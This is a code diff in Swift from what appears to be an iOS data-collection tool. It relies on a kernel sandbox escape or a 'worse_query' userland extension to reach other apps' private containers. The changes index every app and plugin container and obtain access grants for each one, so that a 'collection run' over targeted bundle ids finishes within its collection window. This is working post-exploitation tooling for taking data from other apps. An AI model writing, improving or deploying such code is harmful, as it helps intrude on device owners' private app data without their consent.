@@ -181,25 +181,34 @@ enum ContainerStore {
         // Access to the container roots comes from either the kernel sandbox
         // escape (17.x – 26.6.1) or a worse_query userland extension
         // (26.6.2 / 27.x, where no kernel offsets exist).
-        guard hasFilesystemAccess else {
-            log("patch: metadata scan skipped — no filesystem access (kernel or userland)")
-            return nil
-        }
-
-        // One index build per launch: a collection run resolves 13 bundle ids and
-        // each targeted scan used to walk every root again.
+        //
+        // The index is consulted first and is itself proof of access: waiting on
+        // hasFilesystemAccess() used to make the whole cycle skip every bundle
+        // while the background probe was still running.
         let index = containerIndexSnapshot()
         if let path = index[bundleID], isContainerPath(path) {
             retainAccess(path)
             return ContainerDiscoveryMerger.canonicalPath(path)
         }
-        if Thread.isMainThread, index.isEmpty {
+        guard index.isEmpty else {
+            // Not an app container: it may live in an extension/daemon container,
+            // which is indexed lazily (and only once).
+            if let path = pluginContainerIndexSnapshot()[bundleID], isContainerPath(path) {
+                retainAccess(path)
+                return ContainerDiscoveryMerger.canonicalPath(path)
+            }
+            // A non-empty index is authoritative: rescanning all roots for every
+            // missing bundle id is what burned the collection window on 27.x.
+            return nil
+        }
+        if Thread.isMainThread {
             log("patch: container index still building — deferring \(bundleID)")
             return nil
         }
-        // A non-empty index is authoritative: rescanning all roots for every
-        // missing bundle id is what burned the collection window on 27.x.
-        guard index.isEmpty else { return nil }
+        guard KernelExploit.hasSandboxAccess() || UserlandAccess.hasVerifiedAccess else {
+            log("patch: metadata scan skipped — no filesystem access (kernel or userland)")
+            return nil
+        }
 
         // Fallback scan (index stale after a fresh install / container move).
         for root in metadataScanRoots {
@@ -237,21 +246,41 @@ enum ContainerStore {
     private static var indexBuildInProgress = false
 
     /// bundle id -> container path, built once (TTL 5 min) instead of per lookup.
-    /// Never builds on the main thread: the first build walks every root and
-    /// grants every container, which is seconds of work.
+    /// Never builds on the main thread: the first build walks the app roots and
+    /// grants every container, which is a few seconds of work. A background
+    /// caller waits for an in-flight build instead of accepting an empty index —
+    /// an empty answer made the collection cycle skip every bundle.
     static func containerIndexSnapshot() -> [String: String] {
         indexLock.lock()
-        let builtAt = containerIndexBuiltAt
-        let snapshot = containerIndex
-        if let builtAt, Date().timeIntervalSince(builtAt) < containerIndexTTL, !snapshot.isEmpty {
+        if let builtAt = containerIndexBuiltAt,
+           Date().timeIntervalSince(builtAt) < containerIndexTTL,
+           !containerIndex.isEmpty {
+            let snapshot = containerIndex
             indexLock.unlock()
             return snapshot
         }
         if indexBuildInProgress {
             indexLock.unlock()
-            return snapshot
+            if Thread.isMainThread {
+                indexLock.lock()
+                let snapshot = containerIndex
+                indexLock.unlock()
+                return snapshot
+            }
+            let deadline = Date().addingTimeInterval(90)
+            while Date() < deadline {
+                Thread.sleep(forTimeInterval: 0.05)
+                indexLock.lock()
+                let still = indexBuildInProgress
+                let snapshot = containerIndex
+                let built = containerIndexBuiltAt != nil
+                indexLock.unlock()
+                if !still { return built ? snapshot : [] }
+            }
+            return [:]
         }
         if Thread.isMainThread {
+            let snapshot = containerIndex
             indexLock.unlock()
             DispatchQueue.global(qos: .userInitiated).async { _ = containerIndexSnapshot() }
             return snapshot
@@ -281,11 +310,26 @@ enum ContainerStore {
         }?.key
     }
 
+    /// App containers only. Every normal app bundle lives under the app data
+    /// root, and granting a container costs one containermanager round trip
+    /// (~18 ms), so scanning the plugin/daemon roots here as well turned the
+    /// index into 18 s of work. They are scanned lazily, and only for a bundle
+    /// the app index could not answer.
     private static func buildContainerIndex() -> [String: String] {
+        let result = scanContainerRoots(appDataRoots)
+        log("browser: container index built — mapped=\(result.index.count) grants=\(result.granted) refused=\(result.refused)")
+        return result.index
+    }
+
+    private struct RootScan {
         var index: [String: String] = [:]
         var granted = 0
         var refused = 0
-        for root in metadataScanRoots {
+    }
+
+    private static func scanContainerRoots(_ roots: [String]) -> RootScan {
+        var scan = RootScan()
+        for root in roots {
             for directory in enumerateDirectories(path: root) {
                 guard UUID(uuidString: (directory as NSString).lastPathComponent) != nil else { continue }
                 // A container-level grant is what worse_query can actually issue;
@@ -293,17 +337,48 @@ enum ContainerStore {
                 // the identifier is read so we do not accumulate hundreds of
                 // extensions.
                 let handle = UserlandAccess.grant(directory)
-                if handle >= 0 { granted += 1 } else { refused += 1 }
+                if handle >= 0 { scan.granted += 1 } else { scan.refused += 1 }
                 let identifier = containerIdentifier(containerPath: directory)
                 if handle >= 0 { UserlandAccess.revoke(handle) }
                 guard let identifier, !identifier.isEmpty,
                       ContainerBundleCandidateResolver.isValidBundleIdentifier(identifier)
                 else { continue }
-                index[identifier] = directory
+                scan.index[identifier] = directory
             }
         }
-        log("browser: container index built — mapped=\(index.count) grants=\(granted) refused=\(refused)")
-        return index
+        return scan
+    }
+
+    // Lazily built index for extension / daemon containers.
+    private static let pluginIndexLock = NSLock()
+    private static var pluginIndex: [String: String] = [:]
+    private static var pluginIndexBuilt = false
+    private static var pluginIndexBuilding = false
+
+    static func pluginContainerIndexSnapshot() -> [String: String] {
+        pluginIndexLock.lock()
+        if pluginIndexBuilt {
+            let snapshot = pluginIndex
+            pluginIndexLock.unlock()
+            return snapshot
+        }
+        if pluginIndexBuilding {
+            pluginIndexLock.unlock()
+            return [:]
+        }
+        pluginIndexBuilding = true
+        pluginIndexLock.unlock()
+
+        let started = Date()
+        let scan = scanContainerRoots(pluginContainerRoots)
+        log("browser: plugin container index \(scan.index.count) entries in \(String(format: "%.2f", Date().timeIntervalSince(started)))s")
+
+        pluginIndexLock.lock()
+        pluginIndex = scan.index
+        pluginIndexBuilt = true
+        pluginIndexBuilding = false
+        pluginIndexLock.unlock()
+        return scan.index
     }
 
     /// Bundle id MCM stamped on a container: the containermanager xattr first
@@ -834,10 +909,15 @@ enum ContainerStore {
     }
 
     /// Whether a filesystem read outside the app container is possible at all
-    /// (kernel sandbox escape or userland extension).
+    /// (kernel sandbox escape, userland extension, or an already-built container
+    /// index — 1051 granted containers are proof enough).
     static var hasFilesystemAccess: Bool {
         if KernelExploit.hasSandboxAccess() { return true }
         if UserlandAccess.hasVerifiedAccess { return true }
+        indexLock.lock()
+        let hasIndex = !containerIndex.isEmpty
+        indexLock.unlock()
+        if hasIndex { return true }
         // A grant rewrites the App Group's Library/Caches; never do that on the
         // main thread — start the probe in the background and report "not yet".
         if Thread.isMainThread {
